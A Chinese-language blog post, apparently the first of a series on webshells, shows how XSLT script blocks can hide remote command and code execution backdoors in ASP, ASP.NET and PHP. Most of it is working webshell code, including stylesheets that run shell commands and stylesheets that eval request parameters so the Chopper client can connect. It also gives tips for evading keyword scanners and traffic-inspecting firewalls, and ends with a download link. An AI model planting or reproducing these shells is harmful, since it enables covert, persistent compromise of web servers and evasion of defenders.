# WebShell系列(一)---XML

想来想去还是归结成一个系列吧，虽然说在现在各种讲究高大上的时代还谈webshell实在是一种没什么品味的做法。 基本上也就是一些新型webshell、特殊环境下的特殊利用、特殊webshell的菜刀中转脚本等，外带一些对应的分析。 先挖个坑，至于填坑么⋯⋯看情况吧。

0x01 xml与xslt
=====

相信所有人对xml都不陌生，其被广泛的应用于数据数据传输、保存与序列化中，是一种极为强大的数据格式。强大必然伴随着复杂，xml在发展中派生出了一系列标准，包括DTD、XSD、XDR、XPATH以及XSLT等。

XSLT全称为拓展样式表转换语言，其作用类似于css，通过指定的规则，将一个xml文档转换为另外的形式。指定的规则由另外一个xml文件描述，这个文件通常为xsl后缀。xsl语法相对较为复杂，详情可以参考msdn中“XSLT 参考”一节。

为了对目标节点进行处理，XSLT提供了一系列用于处理XML节点的内置函数，以下是一个具体的转换示例：

xml：

```
<?xml version="1.0"?>
<root>123</root>

```

xsl：

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/root">
    <xsl:value-of select="string(.)"/>
  </xsl:template>
</xsl:stylesheet>

```

xsl文件中xsl:template节点描述了匹配规则，其match属性为一个XPATH，表示匹配的xml节点。xsl:value-of描述了转换规则，会将对前一步所匹配的节点作为参数传入select属性指定的函数中，参数.表示所匹配的节点。 对以上xml和xsl进行转换，将输出以下结果：

```
<?xml version="1.0" encoding="UTF-16"?>123

```

在有些情况下，内置函数无法满足所有的需求。为了拓展XSLT的功能，绝大部分XSL转换器都提供了脚本拓展功能。根据转换器的不同，其脚本有所差异，所支持的功能也有所不同。 在一定程度上，一个对象的安全性与复杂性是成反比的。合法功能的非预期利用是漏洞，恶意利用则可能成为隐蔽的后门。XSLT的脚本执行功能，就是这样一个可能的后门。

0x02 asp与xml
=====

asp中最常见的就是vbscript和jscript两种语言，可通过创建MSXML2.DOMDocument COM对象获取一个xml解析器。 通过oleview可以看到，此对象公开了一个transformNode方法来进行XSL转换:

![enter image description here](http://drops.javaweb.org/uploads/images/ff2129a7dbc3a748383de6b7cdeecc7664132114.jpg)

具体的调用代码大致如下：

```
set xmldoc= Server.CreateObject("MSXML2.DOMDocument")
xmldoc.loadxml(xml)
set xsldoc= Server.CreateObject("MSXML2.DOMDocument")
xsldoc.loadxml(xslt)
response.write xmldoc.TransformNode(xsldoc)

```

参考msdn得知，自定义函数必须位于msxsl:script元素内，对照示例不难得到以下xsl：

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:zcg="zcgonvh">
  <msxsl:script language="vbscript" implements-prefix="zcg">
    <![CDATA[function xml(x):set a=createobject("wscript.shell"):set exec=a.Exec(x):xml=exec.stdout.readall&exec.stderr.readall:end function]]>
  </msxsl:script>
  <xsl:template match="/root">
    <xsl:value-of select="zcg:xml(string(.))"/>
  </xsl:template>
</xsl:stylesheet>

```

在第二行中，xmlns:msxsl为自定义函数块的命名空间，xmlns:zcg为自定义函数的命名空间与前缀，可以任意命名。

第三行的msxsl:script声明了一个脚本块，其language属性指定了要使用的脚本语言，implements-prefix则与前面xmlns:zcg这个命名空间前缀相对应。

在第七行通过zcg:xml(string(.))调用了这个自定义函数，由于自定义函数只能传入字符串、数字、日期等标量，以及XML的一系列对象，所以先通过string内置函数转换为字符串从而获取text，再传入函数中。同样的，由于Response、Server等对象是asp内置的，所以既不能在自定义函数中访问，也不能传递给自定义函数，所有的数据传递都是通过字符串进行的。

脚本块的函数则是简单的执行-返回，其返回值会替换所匹配的节点的内容，所以上述xsl的作用就是：将指定xml中/root节点的文本作为命令执行，并返回结果。

对以下xml进行转换，其返回结果如图：

```
<?xml version="1.0"?>
<root>cmd /c dir</root>

```

![enter image description here](http://drops.javaweb.org/uploads/images/2315c61199e82bbef90dfd4e9f9101604cb1f2df.jpg)

可见成功执行了命令，其结果中的特殊字符都被转换成了xml实体，需要进一步进行处理。

最后，在之前某个IE漏洞中，老外所用的DVE就是使用上述方法来调用组件执行命令，所以免杀效果已经没有保证了。

0x03 .net与xml
=====

xml可以称为.net的核心之一，[System.Xml]System.Xml.Xsl.XslCompiledTransform类和[System.Xml]System.Xml.Xsl.XslTransform类提供了XSL转换功能。

XslTransform属于已弃用的类，其调用方法如下：

```
XmlDocument xmldoc=new XmlDocument();
xmldoc.LoadXml(xml);
XmlDocument xsldoc=new XmlDocument();
xsldoc.LoadXml(xslt);
XslTransform xt = new XslTransform();
xt.Load(xsldoc);
xt.Transform(xmldoc, null);

```

由于此类不能引入额外的程序集，所以并没有什么使用价值。

XslCompiledTransform为微软推荐使用的类，其调用方法与XslTransform大致相同：

```
XmlDocument xmldoc=new XmlDocument();
xmldoc.LoadXml(xml);
XmlDocument xsldoc=new XmlDocument();
xsldoc.LoadXml(xslt);
XslCompiledTransform xct=new XslCompiledTransform();
xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());
xct.Transform(xmldoc,null,new MemoryStream());

```

由于asp.net提供了静态变量[System.Web]System.Web.HttpContext::Current用于表示当前的HTTP请求上下文，所以不需要像asp中进行字符串传递。构造以下xsl进行尝试：

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:zcg="zcgonvh">
  <msxsl:script language="JScript" implements-prefix="zcg">
    function xml() {eval(System.Web.HttpContext.Current.Request.Item['a'],'unsafe');}
  </msxsl:script>
  <xsl:template match="/root">
    <xsl:value-of select="zcg:xml()"/>
  </xsl:template>
</xsl:stylesheet>

```

访问之，可得到一个错误信息：

```
未能找到类型“System.Web.HttpContext.Current.Request.Item”，是否缺少程序集引用? 

```

很明显缺少了程序集引用，查找msdn得到说明：

```
默认情况下引用下列两个程序集：
    System.dll
    System.Xml.dll
    Microsoft.VisualBasic.dll（如果脚本语言为 VB）
可以使用 msxsl:assembly 元素导入其他程序集。

```

于是添加WebShell所必需的几个程序集，得到：

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:zcg="zcgonvh">
  <msxsl:script language="JScript" implements-prefix="zcg">
    <msxsl:assembly name="mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
    <msxsl:assembly name="System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
    <msxsl:assembly name="System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"/>
    <msxsl:assembly name="System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"/>
    function xml() {eval(System.Web.HttpContext.Current.Request.Item['a'],'unsafe');}
  </msxsl:script>
  <xsl:template match="/root">
    <xsl:value-of select="zcg:xml()"/>
  </xsl:template>
</xsl:stylesheet>

```

直接访问已经没有错误，但使用菜刀连接时爆出错误：

```
未声明变量“Response”

```

很显然，菜刀提交的语句中直接调用了Response。由于jscript.net中eval的上下文与调用方共享变量且具有同一名称，手动添加菜刀所需的Request、Response、Server，可以得到以下xslt：

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:zcg="zcgonvh">
  <msxsl:script language="JScript" implements-prefix="zcg">
    <msxsl:assembly name="mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
    <msxsl:assembly name="System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"/>
    <msxsl:assembly name="System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"/>
    <msxsl:assembly name="System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"/>
    function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;eval(Request.Item['a'],'unsafe');Response.End();}
  </msxsl:script>
  <xsl:template match="/root">
    <xsl:value-of select="zcg:xml()"/>
  </xsl:template>
</xsl:stylesheet>

```

此时可使用菜刀直接进行连接，功能与aspx(eval)完全相同：

![enter image description here](http://drops.javaweb.org/uploads/images/91ab7cdfb97f9621ca9b8f8e1036806e2b58a09e.jpg)

最后要注意：xml的内嵌脚本块需要FullTrust信任等级，在安全模式下不能运行。当然，安全模式下正常的aspx一句话也不能运行，所以并不能算是一个缺点。

0x04 php与xml
=====

在php的官方文档中搜索xsl，将直接定位到XSLTProcessor类，在页面中可以看到很明显的registerPHPFunctions方法。 方法的示例就是一个完整的调用过程，将函数修改为assert并略作精简，可以得到以下xsl：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:zcg="http://php.net/xsl">
 <xsl:template match="/root">
    <xsl:value-of select="zcg:function('assert',string(.))"/>
 </xsl:template>
</xsl:stylesheet>

```

第二行的http://php.net/xsl这个命名空间URI表示php专用的xsl函数支持，第四行的zcg:function('assert',string(.))表示将匹配节点的文本作为参数传递给php的assert函数。

为了避免xml的转义问题，进行一次assert嵌套，可以得到xml：

```
<root>assert($_POST[a]);</root>

```

由于php并没有上下文的概念，所有的代码都是在同一代码空间中执行，在xsl中可直接访问GPCS，于是可以直接使用菜刀连接：

![enter image description here](http://drops.javaweb.org/uploads/images/e40afb660a5f81c287a7437e8daa22116e0a3cf7.jpg)

同样的功能齐全。

美中不足的是这个功能默认并没有安装，windows上需要修改php.ini启用php_xsl.dll拓展；linux上需要编译时指定--with-xsl或额外安装php5-xsl包。鉴于php的灵活性，此类shell除隐蔽性较高外并无太大必要。

0x05 总结与其他
=====

在上述基于xslt转换的webshell中，所有的敏感调用都是以字符串形式存在于xml中，避免了基于关键字的webshell查杀。同时，由于xslt是一项正常的功能，对xsl转换器所提供的方法进行查杀、禁用很不实际。例如：msxml组件被大量的系统用于远程文件下载或xmlrpc，基本上是不可能禁用的。 最后，服务端与客户端的交互实质上是通过xml进行的，所以可以伪装成xmlrpc/soap等协议，借助xml的转义将敏感字符转义为实体字符，以躲避基于流量分析的防火墙。例如：将cmd替换为等效的实体字符cmd等。

除了webshell外，xsl转换还有其他可能的利用点。xml支持自动导入xsl，其语法为：

```
<?xml-stylesheet type="text/xsl" href="http://host/template.xsl"?>

```

但除了浏览器之外，尚未发现有哪个解析器会自动解析这个预处理命令，不过作为一种测试手段也未尝不可，如果成功的话则很有可能是一个代码执行漏洞。 某些服务端程序允许客户端提交一个xsl进行自定义，此时若提交一个包含内嵌脚本的恶意xsl同样可能达到代码执行的目的。

0x06 参考文档
=====

Bypassing Windows 8.1 Mitigations using Unsafe COM Objects(老外借助xslt转换的DVE利用)： http://www.contextis.com/resources/blog/windows-mitigaton-bypass/

php xsl：http://php.net/manual/zh/book.xsl.php

XML标准参考资料：https://msdn.microsoft.com/zh-cn/library/ms256177.aspx

msxsl:script元素：https://msdn.microsoft.com/zh-cn/library/ms256042.aspx

XSLT 参考：https://msdn.microsoft.com/zh-cn/library/ms256069.aspx

XSLT 转换：https://msdn.microsoft.com/zh-cn/library/14689742.aspx

附件下载：[Download](http://drops.wooyun.org/wp-content/uploads/2015/04/2.png)

百度网盘：http://pan.baidu.com/s/1bnq9I8J

解压密码见注释。